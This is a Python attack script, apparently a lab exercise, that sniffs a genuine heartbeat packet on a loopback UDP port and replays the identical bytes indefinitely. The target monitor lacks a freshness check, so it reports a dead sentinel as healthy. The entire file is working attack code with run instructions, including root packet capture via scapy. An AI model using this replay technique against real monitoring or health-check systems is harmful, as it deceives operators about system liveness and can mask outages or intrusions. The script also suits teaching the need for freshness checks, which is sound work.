"""
replay.py - Heartbeat replay attack against the monitor.

Captures a genuine beat from the connection and resends the exact bytes repeatedly.
The replayed beat keeps a stale timestamp and sequence #.
Since the monitor has no freshness check, it accepts the stale beat
and reports the dead sentinel as healthy.

Two phases must be run seperately:
	1. capture - Sniffs the loopback for a real heartbeat and saves the raw bytes to a
	bin file. This needs scapy and root since the monitor owns port 9100.
		sudo python3 replay.py capture
		OR
		sudo "$(which python3)" replay.py capture (if using virual environment)
	2. replay - Resends the captured bytes to the monitor
		python3 replay.py replay

You can skip to the replay phase by handing a beat another way (i.e. tcpdump):
	ex: python3 replay.py replay --payload "HEARTBEAT|pid=1234|seq=5|ts=1730000000000"
"""

import argparse
import socket
import sys
import time

HOST = "127.0.0.1"
HEARTBEAT_PORT = 9100
DEFAULT_CAPFILE = "beat.bin"

def capture(args):
	try:
		from scapy.all import sniff, UDP
	except ImportError:
		sys.exit("capturing needs scapy (pip install scapy) and root.\n"
			"Alternatively, select a beat and use:		python3 replay.py replay \"HEARTBEAT|pid=...|seq=...|ts=...\"")

	print(f"sniffing {args.iface} for one beat on udp/{args.port} (timeout {args.timeout}s)")

	packets = sniff(iface=args.iface, filter=f"udp and port {args.port}", count=1, timeout=args.timeout)
	if not packets:
		sys.exit("no heartbeat captured - sentinel might not be running")

	raw = bytes(packets[0][UDP].payload)
	with open(args.outfile, "wb") as file:
		file.write(raw)

	print(f"captured {len(raw)} bytes -> {args.outfile}")
	print(f"	beat: {raw.decode(errors='replace')}")

def load_beat(args):
	if args.payload is not None:
		return args.payload.encode()
	if args.hex is not None:
		return bytes.fromhex(args.hex)
	try:
		with open(args.infile, "rb") as file:
			return file.read()
	except FileNotFoundError:
		sys.exit(f"no captured beat at {args.infile}")

def replay(args):
	data = load_beat(args)
	if not data:
		sys.exit("nothing to replay (captured beat is empty)")

	show = data.decode(errors="replace").strip()
	print(f"replaying captured beat to {args.host}:{args.port}")
	print(f"	bytes: {show}")

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sent = 0
	try:
		while args.count == 0 or sent < args.count:
			sock.sendto(data, (args.host, args.port))
			sent += 1
			print(f"replayed #{sent}")
			time.sleep(args.interval)
	except KeyboardInterrupt:
		print("\nstopped")
	finally:
		sock.close()

	print(f"done: replayed {sent} identical beat(s)")

def main():
	parser = argparse.ArgumentParser(description="Heartbeat replay attacker")
	sub = parser.add_subparsers(dest="cmd", required=True)

	cap = sub.add_parser("capture", help="sniff one beat and save it (need scapy & root)")
	cap.add_argument("--iface", default="lo", help="interface to sniff (default: lo)")
	cap.add_argument("--port", type=int, default=HEARTBEAT_PORT)
	cap.add_argument("--timeout", type=int, default=10, help="seconds to wait for a beat")
	cap.add_argument("--outfile", default=DEFAULT_CAPFILE)
	cap.set_defaults(func=capture)

	rep = sub.add_parser("replay", help="resend captured beat's bytes repeatedly")
	rep.add_argument("--infile", default=DEFAULT_CAPFILE, help="captured beat file")
	rep.add_argument("--payload", default=None, help="replay this beat string instead of a file")
	rep.add_argument("--hex", default=None, help="replay these bytes (hex) instead of a file")
	rep.add_argument("--host", default=HOST)
	rep.add_argument("--port", default=HEARTBEAT_PORT)
	rep.add_argument("--interval", type=float, default=0.5, help="seconds between replays")
	rep.add_argument("--count", type=int, default=0, help="how many times (0=forever)")
	rep.set_defaults(func=replay)

	args = parser.parse_args()
	args.func(args)

if __name__ == "__main__":
	main()
